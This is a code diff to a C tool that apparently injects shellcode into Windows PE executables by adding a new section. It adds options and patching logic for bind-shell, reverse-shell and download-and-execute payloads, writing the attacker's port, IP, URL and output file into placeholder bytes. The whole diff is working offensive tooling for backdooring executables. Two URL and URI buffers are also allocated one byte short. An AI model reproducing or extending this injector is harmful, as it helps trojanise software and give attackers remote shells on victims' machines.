@@ -174,15 +174,21 @@ int main(int argc, char *argv[])
 	IMAGE_DOS_HEADER idh ;
 	IMAGE_NT_HEADERS inth ;
 	IMAGE_SECTION_HEADER ish[ max_sections ] = {0} ;
-	char *buffer,*newbuffer,*outputfile,*inputfile,*n; 
+	char *buffer,*newbuffer,*outputfile,*inputfile,*n,*url,*uri,*of; 
 	unsigned short port;
 	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size,needle_len ;
 	IMAGE_SECTION_HEADER *new_ish;
 	char *shellcode,*needle_offset;
 	char patch_port[]="\x53\x53";
 	char patch_ip[]= "\x49\x49\x49\x49";
+	char patch_URL[]= "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU";
+	char patch_URI[]= "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+	char patch_output[]= "OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO";
 	DWORD patch_offset;
 	long ip;
+	BOOL bind = FALSE;
+	BOOL reverse = FALSE;
+	BOOL dwnexec = FALSE;
 //char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
 //"\x60";	//PUSHAD
 
@@ -218,19 +224,22 @@ for (count = 0; count < argc; count++)
 			shellcode=(CHAR *)calloc(sizeof(bind_shell_threaded_patched),1);
 			memcpy(shellcode,bind_shell_threaded_patched,sizeof(bind_shell_threaded_patched));
 			shellcode_size = sizeof(bind_shell_threaded_patched);
+			bind = TRUE;
 		}
 		if (!strcmp(argv[count+1], "reverse"))
 		{
-			shellcode=(CHAR *)calloc(sizeof(reverse_shell_threaded),1);
+			shellcode=(CHAR *)calloc(sizeof(reverse_shell_threaded_patched),1);
 			memcpy(shellcode,reverse_shell_threaded_patched,sizeof(reverse_shell_threaded_patched));
 			shellcode_size = sizeof(reverse_shell_threaded_patched);
+			reverse = TRUE;
 		}
 		if (!strcmp(argv[count+1], "download & execute"))
 		{
 			printf("[*] there is no need for Download and Execute to be threaded so using normal Shell\n");
-			shellcode=(CHAR *)calloc(sizeof(download_execute),1);
-			memcpy(shellcode,download_execute,sizeof(download_execute));
-			shellcode_size = sizeof(download_execute);
+			shellcode=(CHAR *)calloc(sizeof(download_execute_patched),1);
+			memcpy(shellcode,download_execute_patched,sizeof(download_execute_patched));
+			shellcode_size = sizeof(download_execute_patched);
+			dwnexec = TRUE;
 		}
 	}
 	if (!strcmp(argv[count],"-s"))
@@ -240,18 +249,21 @@ for (count = 0; count < argc; count++)
 			shellcode=(CHAR *)calloc(sizeof(bind_shell),1);
 			memcpy(shellcode,bind_shell,sizeof(bind_shell));
 			shellcode_size = sizeof(bind_shell);
+			bind = TRUE;
 		}
 		if (!strcmp(argv[count+1], "reverse"))
 		{
 			shellcode=(CHAR *)calloc(sizeof(reverse_shell),1);
 			memcpy(shellcode,reverse_shell,sizeof(reverse_shell));
 			shellcode_size = sizeof(reverse_shell);
+			reverse = TRUE;
 		}
 		if (!strcmp(argv[count+1], "download & execute"))
 		{
-			shellcode=(CHAR *)calloc(sizeof(download_execute),1);
-			memcpy(shellcode,download_execute,sizeof(download_execute));
-			shellcode_size = sizeof(download_execute);
+			shellcode=(CHAR *)calloc(sizeof(download_execute_patched),1);
+			memcpy(shellcode,download_execute_patched,sizeof(download_execute_patched));
+			shellcode_size = sizeof(download_execute_patched);
+			dwnexec = TRUE;
 		}
 	}
 	if (!strcmp(argv[count],"-o"))
@@ -272,15 +284,47 @@ for (count = 0; count < argc; count++)
 	{
 		ip = inet_addr(argv[count+1]);
 	}
+	if(!strcmp(argv[count],"-u"))
+	{
+		url = (CHAR *)calloc(strlen(argv[count+1]+1),1);
+		strcpy(url,argv[count+1]);
+	}
+	if(!strcmp(argv[count],"-f"))
+	{
+		uri = (CHAR *)calloc(strlen(argv[count+1]+1),1);
+		strcpy(uri,argv[count+1]);
+	}
+	if(!strcmp(argv[count],"-of"))
+	{
+		of = (CHAR *)calloc(strlen(argv[count+1])+1,1);
+		strcpy(of,argv[count+1]);
+	}
 }
-	
+if (bind == TRUE)
+{
+// Shellcode Patching PORT
+	memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
+	memcpy(shellcode+patch_offset,&port,sizeof(port));
+}
+if (reverse == TRUE)
+{
 // Shellcode Patching PORT
 	memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
 	memcpy(shellcode+patch_offset,&port,sizeof(port));
 // Reverse Shellcode Patching HOST
 	memmem(shellcode,shellcode_size,patch_ip,sizeof(DWORD),&patch_offset);
 	memcpy(shellcode+patch_offset,&ip,sizeof(ip));
-	
+}
+if (dwnexec == TRUE)
+{
+	memmem(shellcode,shellcode_size,patch_URL,sizeof(patch_URL)-1,&patch_offset);
+	memcpy(shellcode+patch_offset,url,strlen(url)+1);
+	memmem(shellcode,shellcode_size,patch_URI,sizeof(patch_URI)-1,&patch_offset);
+	memcpy(shellcode+patch_offset,uri,strlen(uri)+1);
+	memmem(shellcode,shellcode_size,patch_output,sizeof(patch_output)-1,&patch_offset);
+	memcpy(shellcode+patch_offset,of,strlen(of)+1);
+}
+
 	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);
 
 
